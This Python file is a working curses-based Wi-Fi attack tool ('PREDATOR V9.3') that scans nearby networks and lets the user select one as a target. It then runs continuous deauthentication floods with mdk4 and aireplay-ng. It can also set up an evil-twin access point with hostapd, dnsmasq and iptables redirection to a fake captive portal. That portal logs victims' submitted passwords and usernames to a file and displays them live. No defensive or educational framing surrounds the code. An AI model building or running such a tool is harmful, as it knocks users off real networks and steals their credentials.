import os, subprocess, time, csv, signal, curses, sys, re, threading, http.server, socketserver, cgi, shutil
from datetime import datetime

# --- CONFIG (V9.3 ULTIMATE STEALTH) ---
INTERFACE = "wlan0"
AP_IP = "10.0.0.1"
NETMASK = "255.255.255.0"
DHCP_RANGE = "10.0.0.10,10.0.0.50,12h"
WEB_PORT = 8080

if os.path.exists("/dev/shm"):
    TEMP_FILE = "/dev/shm/fsociety_scan"
    CONF_DIR = "/dev/shm"
else:
    TEMP_FILE = "/tmp/fsociety_scan"
    CONF_DIR = "/tmp"

input_buffer = ""
selected_target = None
is_running = True
is_in_menu = False 
scan_proc = None
current_band = "abg" 
active_clients = {} 
DEVNULL = open(os.devnull, 'w')
evil_twin_procs = []

# --- OUI DATABASE (Simplified Vendor Lookup) ---
def get_vendor_from_oui(oui):
    """Simple hardcoded OUI lookup for common vendors based on MAC prefix."""
    oui_db = {
        "000C29": "VMware",
        "001C42": "Cisco",
        "001E8C": "Apple",
        "001E52": "Microsoft/XBOX",
        "001A11": "Samsung",
        "001F6E": "Google/Nexus",
        "080027": "VirtualBox",
        "286EAA": "Apple",
        "3C77E6": "Samsung",
        "4C72B9": "Google",
        "708E29": "Xiaomi",
        "A0999B": "Apple/iPhone",
        "00E04C": "Realtek/PCIe"
    }
    return oui_db.get(oui[:6].upper(), "Unknown Vendor")

# --- CHECK DEPENDENCIES ---
def check_tools():
    """ตรวจสอบเครื่องมือที่จำเป็นสำหรับการโจมตีคู่ (Dual-Wield)"""
    missing = []
    if not shutil.which("hostapd"): missing.append("hostapd")
    if not shutil.which("dnsmasq"): missing.append("dnsmasq")
    if not shutil.which("aireplay-ng"): missing.append("aircrack-ng")
    if not shutil.which("mdk4"): missing.append("mdk4") 
    return missing

# --- WEB SERVER (SMART FILTER) ---
class PortalHandler(http.server.SimpleHTTPRequestHandler):
    """Web Server สำหรับ Evil Twin Captive Portal และดักจับ Credentials"""
    def log_message(self, format, *args): return 
    
    def do_GET(self):
        # Redirect Captive Portal detection requests to our login page
        if self.path in ['/generate_204', '/gen_204', '/ncsi.txt', '/hotspot-detect.html']:
            self.path = '/fsociety/index.html'
        if self.path == '/':
            self.path = '/fsociety/index.html'

        is_fsociety_asset = self.path.startswith("/fsociety/")
        file_exists = os.path.exists(self.path[1:])

        if not file_exists and not is_fsociety_asset:
            self.send_response(302)
            self.send_header('Location', f'http://{AP_IP}:{WEB_PORT}/fsociety/index.html')
            self.end_headers()
            return
            
        if is_fsociety_asset and not file_exists:
             self.path = '/fsociety/index.html'

        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        """ดักจับ POST Data (Username/Password) และบันทึกไว้"""
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            
            # Simple check to prevent log spam from automated systems
            if len(post_data) > 200 or post_data.count('{') > 1 or '"updater":' in post_data:
                return 

            # Check if data contains common credential keywords
            interesting_keys = ['password', 'pass', 'key', 'pin', 'user', 'email']
            is_interesting = any(k in post_data.lower() for k in interesting_keys)
            
            if is_interesting or len(post_data) < 50:
                with open("passwords.txt", "a") as f:
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    clean_data = post_data.replace('password=', '').replace('&', ' | ').replace('+', ' ')
                    f.write(f"[{timestamp}] {clean_data}\n")

        except: pass
        
        # Redirect the victim to Google after submission
        self.send_response(302)
        self.send_header('Location', 'http://www.google.com')
        self.end_headers()
        return

def start_portal_server():
    """เริ่ม Web Server สำหรับ Evil Twin"""
    try:
        os.chdir(os.path.dirname(os.path.abspath(__file__)))
        with socketserver.TCPServer(("", WEB_PORT), PortalHandler) as httpd:
            httpd.serve_forever()
    except: pass

# --- SYSTEM FUNCTIONS ---
def run_silent(cmd):
    """Executes a shell command silently."""
    try: subprocess.run(cmd, shell=True, stdout=DEVNULL, stderr=DEVNULL)
    except: pass

def clean_text(text):
    """Removes ANSI escape codes from text."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def setup_evil_twin_network(ssid, channel):
    """Sets up hostapd and dnsmasq for Evil Twin."""
    global evil_twin_procs
    
    # Aggressive cleanup of network services
    run_silent("sudo airmon-ng check kill")
    run_silent("sudo service NetworkManager stop")
    run_silent(f"sudo ip link set {INTERFACE} down")
    
    # 1. Setup AP interface (wlan0)
    run_silent(f"sudo ip link set {INTERFACE} up")
    run_silent(f"sudo ifconfig {INTERFACE} {AP_IP} netmask {NETMASK} up")
    
    hw_mode = 'g'
    try:
        if int(channel) > 14: hw_mode = 'a'
    except: pass
    
    # Hostapd config
    with open(f"{CONF_DIR}/hostapd.conf", "w") as f:
        f.write(f"\ninterface={INTERFACE}\ndriver=nl80211\nssid={ssid}\nhw_mode={hw_mode}\nchannel={channel}\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n")
    
    # Dnsmasq config
    with open(f"{CONF_DIR}/dnsmasq.conf", "w") as f:
        # We capture DNSMASQ logs for IP/MAC assignment
        f.write(f"\ninterface={INTERFACE}\ndhcp-range={DHCP_RANGE}\ndhcp-option=3,{AP_IP}\ndhcp-option=6,{AP_IP}\nserver=8.8.8.8\nlog-queries\nlog-dhcp\naddress=/#/{AP_IP}\n")
        
    # Start Services
    p1 = subprocess.Popen(["sudo", "hostapd", f"{CONF_DIR}/hostapd.conf"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, preexec_fn=os.setsid) 
    
    # p2: DNSMASQ - Must capture output for DHCP assignments (IP/MAC)
    p2 = subprocess.Popen(["sudo", "dnsmasq", "-C", f"{CONF_DIR}/dnsmasq.conf", "-d"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
    os.set_blocking(p2.stdout.fileno(), False)
    
    evil_twin_procs.extend([p1, p2])
    
    # IP Tables for redirection
    run_silent("sudo iptables --flush")
    run_silent("sudo iptables --table nat --flush")
    run_silent("sudo iptables --delete-chain")
    run_silent("sudo iptables --table nat --delete-chain")
    run_silent(f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:{WEB_PORT}")
    run_silent("sudo iptables -P FORWARD ACCEPT")
    
    # 2. Setup Deauth interface (mon0)
    time.sleep(2) 
    run_silent(f"sudo iw dev {INTERFACE} interface add mon0 type monitor")
    time.sleep(1) 
    run_silent("sudo ifconfig mon0 up")
    run_silent(f"sudo iwconfig mon0 channel {channel}")
    
    return p1, p2 # Return hostapd and dnsmasq processes

def cleanup_evil_twin():
    """Stops Evil Twin related services and cleans interfaces."""
    global evil_twin_procs
    for p in evil_twin_procs:
        try: p.terminate()
        except: pass
    evil_twin_procs = []
    
    run_silent("sudo iw dev mon0 del")
    run_silent("sudo ip link set mon0 down")
    run_silent("sudo iptables --flush")
    run_silent("sudo iptables -t nat --flush")
    run_silent("sudo service NetworkManager start")

def force_cleanup():
    """Kills all related attack processes."""
    cleanup_evil_twin()
    run_silent("sudo pkill -9 -f mdk4")
    run_silent("sudo pkill -9 -f aireplay-ng")
    run_silent("sudo pkill -9 -f airodump-ng")
    run_silent("sudo pkill -9 -f hostapd")
    run_silent("sudo pkill -9 -f dnsmasq")
    run_silent(f"rm -rf {TEMP_FILE}*")

def toggle_scan(status, target_bssid=None, channel=None):
    """Starts or stops the airodump-ng scanning process."""
    global scan_proc, current_band
    if status == "OFF":
        if scan_proc:
            try: os.killpg(os.getpgid(scan_proc.pid), signal.SIGTERM)
            except: pass
            scan_proc = None
        run_silent("sudo pkill -f airodump-ng")
    elif status == "ON" and scan_proc is None:
        run_silent(f"rm -rf {TEMP_FILE}*")
        # Ensure the interface is in monitor mode before running airodump
        run_silent(f"sudo airmon-ng start {INTERFACE}")
        time.sleep(1) # Allow airmon-ng to finish
        cmd = f"sudo airodump-ng {INTERFACE} --band {current_band} --write-interval 1 "
        if target_bssid and channel:
            cmd += f"--bssid {target_bssid} -c {channel} "
        cmd += f"-w {TEMP_FILE} --output-format csv"
        scan_proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid, stdout=DEVNULL, stderr=DEVNULL, stdin=DEVNULL)


def deauth_attack(target, stdscr):
    """
    Handles the DUAL-WIELD Deauth attack workflow with real-time AP status check.
    """
    global is_in_menu, active_clients
    is_in_menu = True
    curses.noecho(); curses.raw()
    
    # Colors setup
    curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK); RED = curses.color_pair(1)
    curses.init_pair(2, curses.COLOR_YELLOW, curses.COLOR_BLACK); YELLOW = curses.color_pair(2)
    curses.init_pair(3, curses.COLOR_CYAN, curses.COLOR_BLACK); CYAN = curses.color_pair(3)
    curses.init_pair(4, curses.COLOR_GREEN, curses.COLOR_BLACK); GREEN = curses.color_pair(4)
    curses.init_pair(6, curses.COLOR_WHITE, curses.COLOR_RED); ALERT = curses.color_pair(6)
    
    mode_type = None
    mode_name = ""
    bg_procs = []
    missing_tools = check_tools()
    
    hostapd_proc = None
    dnsmasq_proc = None
    airodump_proc = None
    deauth_proc = None # Primary heartbeat tracker (MDK4)
    
    # [MENU SELECTION] (Same as V9.2)
    # ... (Omitted for brevity, logic remains the same)
    while True:
        stdscr.erase()
        stdscr.addstr(0, 0, f"🎯 TARGET: {target['essid']}", curses.A_BOLD)
        stdscr.addstr(2, 0, "🔥 SELECT OPERATION MODE (DUAL-WIELD)", curses.A_UNDERLINE)
        
        tools_ok_evil_twin = not any(tool in missing_tools for tool in ["hostapd", "dnsmasq", "mdk4", "aircrack-ng"])
        tools_ok_deauth = not any(tool in missing_tools for tool in ["mdk4", "aircrack-ng"])
        
        if tools_ok_evil_twin: 
            stdscr.addstr(4, 0, "[1] 😈 EVIL TWIN + DUAL MDK4/AIREPLAY FLOOD (Max Aggression)", RED | curses.A_BOLD)
        else: 
            stdscr.addstr(4, 0, f"[1] 😈 EVIL TWIN (DISABLED - Install: {' '.join(missing_tools)})", curses.A_DIM)
            
        if tools_ok_deauth:
            stdscr.addstr(5, 0, "[2] 💣 DUAL MDK4/AIREPLAY FLOOD ONLY (Extreme Deauth)", YELLOW)
        else:
            stdscr.addstr(5, 0, f"[2] 💣 DUAL FLOOD ONLY (DISABLED - Install: {' '.join([t for t in ['mdk4', 'aircrack-ng'] if t in missing_tools])})", curses.A_DIM)
            
        stdscr.addstr(7, 0, "PRESS [Q] TO CANCEL")
        stdscr.refresh()
        
        stdscr.timeout(50) 
        try:
            k = stdscr.getch()
        except:
            k = -1
            
        if k != -1:
            if k == ord('1') and tools_ok_evil_twin: 
                mode_type = 'EVIL_TWIN'
                break
            elif k == ord('2') and tools_ok_deauth: 
                mode_type = 'DEAUTH'
                break
            elif k in (ord('q'), ord('Q')): 
                is_in_menu = False
                force_cleanup()
                toggle_scan("ON")
                return
        time.sleep(0.05)

    # --- SETUP ROUTINE (Common for both modes) ---
    toggle_scan("OFF") 
    stdscr.erase()
    stdscr.addstr(0, 0, "⚙️ INITIALIZING AGGRESSIVE STACK...", curses.A_BOLD)
    stdscr.refresh()
    
    try:
        # Start Interface in Monitor Mode and set channel
        run_silent(f"sudo airmon-ng start {INTERFACE}")
        time.sleep(1)
        
        # Start focused airodump-ng scan on the attack interface (mon0)
        # This is to monitor the real AP's signal strength (BSSID must be in output)
        run_silent(f"rm -rf {TEMP_FILE}*")
        cmd = f"sudo airodump-ng mon0 --bssid {target['bssid']} -c {target['ch']} --write-interval 1 -w {TEMP_FILE} --output-format csv"
        airodump_proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid, stdout=DEVNULL, stderr=DEVNULL, stdin=DEVNULL)
        bg_procs.append(airodump_proc)
        
        # --- MODE SPECIFIC SETUP ---
        if mode_type == 'EVIL_TWIN':
            mode_name = "EVIL TWIN + DUAL FLOOD COMBO"
            hostapd_proc, dnsmasq_proc = setup_evil_twin_network(target['essid'], target['ch'])
            srv_thread = threading.Thread(target=start_portal_server, daemon=True)
            srv_thread.start()
            
            if hostapd_proc: os.set_blocking(hostapd_proc.stdout.fileno(), False)
            if dnsmasq_proc: os.set_blocking(dnsmasq_proc.stdout.fileno(), False)

        elif mode_type == 'DEAUTH':
            mode_name = "DUAL MDK4/AIREPLAY FLOOD ONLY"
            run_silent(f"sudo iwconfig mon0 channel {target['ch']}") # Ensure mon0 is on target channel

        # 2. MDK4 Command (d: Deauth/Disassociation Amok Mode)
        mdk4_cmd = ["sudo", "mdk4", "mon0", "d", "-b", target["bssid"]]
        mdk4_proc = subprocess.Popen(mdk4_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
        os.set_blocking(mdk4_proc.stdout.fileno(), False)
        bg_procs.append(mdk4_proc)
        
        # 3. Aireplay-ng Deauth Command (Mode 0: continuous deauth)
        aireplay_cmd = ["sudo", "aireplay-ng", "--deauth", "0", "-a", target["bssid"], "mon0"]
        aireplay_proc = subprocess.Popen(aireplay_cmd, stdout=DEVNULL, stderr=DEVNULL, preexec_fn=os.setsid)
        bg_procs.append(aireplay_proc)
        
        deauth_proc = mdk4_proc # ใช้ MDK4 เป็นตัวติดตาม heartbeat หลัก
            
    except Exception as e:
        stdscr.addstr(2, 0, f"ERROR: {str(e)}", RED)
        stdscr.refresh()
        time.sleep(2)
        is_in_menu = False
        force_cleanup()
        toggle_scan("ON")
        return

    # [MAIN MONITOR LOOP]
    start_time = time.time()
    hostapd_logs = []
    captured_passwords = []
    client_logs = {} # Stores MAC: {ip, vendor, time}
    target_power = None
    last_log_update = 0
    deauth_count = 0
    
    try:
        while True:
            now = time.time()
            
            # --- 1. MDK4 Heartbeat ---
            if deauth_proc:
                try:
                    deauth_proc.stdout.readlines() 
                    deauth_count += 1
                except: pass 

            # --- 2. Read Passwords ---
            if os.path.exists("passwords.txt"):
                try:
                    with open("passwords.txt", "r") as f:
                        lines = f.readlines()
                        captured_passwords = [l.strip() for l in lines if l.strip()][-5:]
                except: pass

            # --- 3. Read Airodump (Target AP Status) ---
            if os.path.exists(f"{TEMP_FILE}-01.csv"):
                try:
                    with open(f"{TEMP_FILE}-01.csv", 'r', encoding='latin-1') as f:
                        content = f.read().split('\n')
                        for line in content:
                            row = line.split(',')
                            if len(row) >= 14 and row[0].strip() == target['bssid']:
                                target_power = row[8].strip()
                                break
                except: pass

            # --- 4. Read DNSMASQ & Hostapd Logs (Client Connections) ---
            if mode_type == 'EVIL_TWIN':
                if dnsmasq_proc:
                    try:
                        lines = dnsmasq_proc.stdout.readlines()
                        for line in lines:
                            l = clean_text(line.decode('utf-8', errors='ignore').strip())
                            
                            # DHCP LEASE (IP/MAC Assignment)
                            match = re.search(r"dhcp-lease,(?P<ip>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}),(?P<mac>[0-9A-Fa-f:]{17})", l)
                            if match:
                                mac = match.group('mac')
                                ip = match.group('ip')
                                vendor = get_vendor_from_oui(mac)
                                client_logs[mac] = {'ip': ip, 'vendor': vendor, 'time': datetime.now().strftime("%H:%M:%S")}
                                
                            # HOSTAPD Log (Connection Status)
                            if "associated" in l.lower() or "authenticated" in l.lower() or "CONNECTED" in l:
                                if l not in hostapd_logs: hostapd_logs.append(l)
                                if len(hostapd_logs) > 8: hostapd_logs.pop(0)

                    except: pass
            
            # --- DRAW UI (ทุก 0.3 วินาที) ---
            if now - last_log_update > 0.3:
                stdscr.erase()
                h, w = stdscr.getmaxyx()
                
                # Header พร้อม Stats
                elapsed = int(now - start_time)
                header_msg = f" {mode_name} | {target['essid']} | 💣 DUAL ATTACK RUNNING ({deauth_count} cycles) | ⏱{elapsed}s "
                stdscr.addstr(0, 0, header_msg.center(w), ALERT)
                
                box_w = w - 4
                pass_h = 7
                ap_h = 5
                log_h = h - 2 - pass_h - ap_h - 4 # Dynamic height for logs

                # 1. Target AP Status (Real Network Check)
                draw_box(stdscr, 2, 2, ap_h, box_w, "📡 TARGET AP STATUS", CYAN)
                
                status_color = RED if target_power in ['-1', ''] or (target_power is not None and int(target_power) < -70) else GREEN
                status_text = "WEAK/DOWN (Deauth Success!)" if status_color == RED else "STRONG (Attack in Progress)"
                
                stdscr.addstr(3, 4, f"Real AP BSSID: {target['bssid']}", CYAN)
                stdscr.addstr(4, 4, f"Signal Power (PWR): {target_power if target_power else 'N/A'}", YELLOW | curses.A_BOLD)
                stdscr.addstr(5, 4, f"STATUS: {status_text}", status_color | curses.A_BOLD)


                current_y = 2 + ap_h
                
                # 2. Credentials Box
                if mode_type == 'EVIL_TWIN':
                    draw_box(stdscr, current_y, 2, pass_h, box_w, "🔐 CAPTURED CREDENTIALS", GREEN)
                    if captured_passwords:
                        for i, p in enumerate(captured_passwords):
                            if i < pass_h - 2:
                                clean_p = (p[:box_w-6] + '..') if len(p) > box_w-6 else p
                                stdscr.addstr(current_y + 1 + i, 4, f"🔑 {clean_p}", GREEN | curses.A_BOLD)
                    else:
                        stdscr.addstr(current_y + 2, 4, "⏳ Waiting for victim login...", curses.A_DIM)
                        stdscr.addstr(current_y + 3, 4, f"💥 DUAL FLOOD is aggressively kicking users.", YELLOW)
                    
                    current_y += pass_h

                # 3. Client Connection Logs (Evil Twin)
                draw_box(stdscr, current_y, 2, log_h, box_w, "👤 EVIL TWIN CLIENTS & LOGS (DHCP/MAC/IP)", RED)
                
                log_content = []
                
                # Add connected clients (IP/MAC/Vendor)
                sorted_clients = sorted(client_logs.items(), key=lambda x: x[1]['time'], reverse=True)
                for mac, data in sorted_clients:
                    log_content.append(f"[{data['time']}] 🌐 {data['ip']} | 👤 {data['vendor']} | 🖥 {mac}")
                
                # Add Hostapd/Dnsmasq general logs
                for l in hostapd_logs:
                    log_content.append(f"» {l}")

                # Display logs
                display_logs = log_content[:log_h - 2]
                if display_logs:
                    for i, l in enumerate(display_logs):
                        clean_l = (l[:box_w-6] + '..') if len(l) > box_w-6 else l
                        stdscr.addstr(current_y + 1 + i, 4, clean_l, CYAN)
                else:
                     stdscr.addstr(current_y + 2, 4, "No connection logs yet. Check Hostapd status.", curses.A_DIM)


                # Footer
                stdscr.addstr(h-1, 0, " [Q] STOP ATTACK | UI Refresh: 0.3s ", curses.A_REVERSE)
                
                stdscr.refresh()
                last_log_update = now

            # Handle Exit 
            stdscr.timeout(0)
            try:
                k = stdscr.getch()
                if k in (ord('q'), ord('Q')): 
                    break
            except:
                pass
            
            time.sleep(0.05) 
            
    finally:
        # CLEANUP ROUTINE
        stdscr.erase()
        stdscr.addstr(0, 0, "🛑 STOPPING DUAL AGGRESSIVE ATTACK...", curses.A_BOLD | RED)
        stdscr.refresh()
        
        cleanup_evil_twin()
        
        # Kill all background attack processes
        for p in bg_procs: 
            try: 
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
            except: pass
        if deauth_proc: 
            try: 
                os.killpg(os.getpgid(deauth_proc.pid), signal.SIGKILL)
            except: pass
        if airodump_proc:
            try:
                os.killpg(os.getpgid(airodump_proc.pid), signal.SIGKILL)
            except: pass
        
        time.sleep(1)
        
        force_cleanup() 
        
        stdscr.addstr(1, 0, "✅ CLEANUP COMPLETE", GREEN)
        stdscr.addstr(2, 0, "🔄 RESTARTING SCAN...", YELLOW)
        stdscr.refresh()
        time.sleep(1)
        
        toggle_scan("ON") 
        
    is_in_menu = False

def draw_box(stdscr, y, x, h, w, title, color):
    """ฟังก์ชันสำหรับวาดกล่องใน UI"""
    try:
        for i in range(h):
            stdscr.addstr(y+i, x, "│" + " "*(w-2) + "│", color)
        stdscr.addstr(y, x, "┌" + "─"*(w-2) + "┐", color)
        stdscr.addstr(y+h-1, x, "└" + "─"*(w-2) + "┘", color)
        if title:
            stdscr.addstr(y, x+2, f" {title} ", color | curses.A_BOLD)
    except: pass

def main(stdscr):
    """The main curses application loop."""
    global input_buffer, is_running, selected_target, is_in_menu, current_band, active_clients
    # Curses setup
    curses.noecho(); curses.raw(); stdscr.keypad(True); curses.curs_set(0); stdscr.nodelay(True)
    
    # Init Colors
    curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK); RED = curses.color_pair(1)
    curses.init_pair(2, curses.COLOR_YELLOW, curses.COLOR_BLACK); YELLOW = curses.color_pair(2)
    curses.init_pair(3, curses.COLOR_CYAN, curses.COLOR_BLACK); CYAN = curses.color_pair(3)
    curses.init_pair(4, curses.COLOR_GREEN, curses.COLOR_BLACK); GREEN = curses.color_pair(4)
    curses.init_pair(6, curses.COLOR_WHITE, curses.COLOR_RED); ALERT = curses.color_pair(6)
    
    # Start initial scan
    run_silent(f"sudo airmon-ng start {INTERFACE}")
    toggle_scan("ON")
    last_csv = 0
    last_ui = 0
    current_targets = []

    while is_running:
        now = time.time()
        try: 
            curses.noecho()
            curses.curs_set(0)
        except: pass
        
        if is_in_menu: 
            time.sleep(0.1)
            continue
        
        # Key input handling
        stdscr.timeout(0)
        try:
            k = stdscr.getch()
        except:
            k = -1
            
        if k != -1:
            last_ui = 0 
            if k in (ord('q'), ord('Q')): 
                is_running = False
            elif k in (10, 13, curses.KEY_ENTER): 
                if input_buffer.isdigit(): 
                    selected_target = int(input_buffer)
                    input_buffer = "" 
            elif k in (8, 127, curses.KEY_BACKSPACE): 
                input_buffer = input_buffer[:-1]
            elif 48 <= k <= 57: 
                input_buffer += chr(k)

        # CSV Parsing (Main Scan)
        if now - last_csv > 1.0:
            targets_temp = []
            clients_temp = {}
            if os.path.exists(f"{TEMP_FILE}-01.csv"):
                try:
                    with open(f"{TEMP_FILE}-01.csv", 'r', encoding='latin-1') as f:
                        content = f.read().split('\n')
                        sec = 0 
                        for line in content:
                            row = line.split(',')
                            if len(row) < 2: continue
                            if "BSSID" in row[0]: 
                                sec = 1
                                continue
                            if "Station" in row[0]: 
                                sec = 2
                                continue
                            
                            if sec == 1 and len(row) >= 14:
                                targets_temp.append({
                                    "bssid": row[0].strip(),
                                    "ch": row[3].strip(),
                                    "pwr": row[8].strip(),
                                    "essid": row[13].strip()
                                })
                            
                            if sec == 2 and len(row) >= 6:
                                ap = row[5].strip()
                                if len(ap) == 17 and ":" in ap: 
                                    if ap not in clients_temp: 
                                        clients_temp[ap] = set()
                                    clients_temp[ap].add(row[0].strip())
                    active_clients = clients_temp 
                    current_targets = targets_temp
                except: pass
            last_csv = now

        # UI Drawing
        if now - last_ui > 0.2:
            h, w = stdscr.getmaxyx()
            stdscr.erase()
            
            # Sidebar
            menu_width = 22
            sx = w - menu_width
            for i in range(1, h-1): 
                try: 
                    stdscr.addch(i, sx, '│')
                except: pass
            
            # Menu
            stdscr.addstr(1, sx + 2, "STATS", curses.A_UNDERLINE | CYAN)
            stdscr.addstr(2, sx + 2, f"MODE: MONITOR")
            stdscr.addstr(3, sx + 2, f"IFACE: {INTERFACE}")
            stdscr.addstr(5, sx + 2, "CONTROLS", curses.A_UNDERLINE | CYAN)
            stdscr.addstr(6, sx + 2, "[0-9] SELECT ID")
            stdscr.addstr(7, sx + 2, "[Q] EXIT APP")
            
            # Header
            stdscr.addstr(0, 0, f" 📡 PREDATOR V9.3 [ULTIMATE STEALTH] | SCANNING... ", curses.A_REVERSE | CYAN)
            stdscr.hline(1, 0, "-", sx)
            
            # Target List
            col_width = 32
            max_cols = max(1, sx // col_width)
            scan_h = h - 5
            cur_col = 0
            cur_row = 0
            start_y = 2
            
            for i, t in enumerate(current_targets):
                needed_h = 1
                my_clients = []
                if t['bssid'] in active_clients:
                    my_clients = list(active_clients[t['bssid']])[:3] 
                    needed_h += len(my_clients)
                
                if cur_row + needed_h > scan_h: 
                    cur_col += 1
                    cur_row = 0
                if cur_col >= max_cols: 
                    break 
                
                x = cur_col * col_width
                y = start_y + cur_row
                freq = "5G" if t['ch'].isdigit() and int(t['ch']) > 14 else "2.4G"
                
                try:
                    stdscr.addstr(y, x, f"{i+1:02}", GREEN | curses.A_BOLD)
                    clean_ssid = t['essid'][:14]
                    stdscr.addstr(f" {clean_ssid:<14}", curses.A_NORMAL)
                    stdscr.addstr(f" {freq} {t['pwr']}", curses.A_DIM)
                except: pass
                cur_row += 1
                
                for j, c_mac in enumerate(my_clients):
                    char = "└" if j == len(my_clients) - 1 else "├"
                    try: 
                        stdscr.addstr(y + 1 + j, x + 2, f"{char}{c_mac}", curses.A_DIM)
                    except: pass
                    cur_row += 1
            
            # Input Line
            stdscr.addstr(h-1, 0, f" SELECT TARGET ID > {input_buffer}_ ", curses.A_REVERSE)
            stdscr.refresh()
            last_ui = now
        
        # Selection Logic
        if selected_target is not None:
            idx = selected_target - 1
            selected_target = None
            if 0 <= idx < len(current_targets): 
                deauth_attack(current_targets[idx], stdscr)
        
        time.sleep(0.05)

if __name__ == "__main__":
    try: 
        curses.wrapper(main)
    except KeyboardInterrupt: 
        pass
    finally: 
        cleanup_evil_twin()
        force_cleanup()
        DEVNULL.close()
        print("\n[!] SYSTEMS CLEANED.")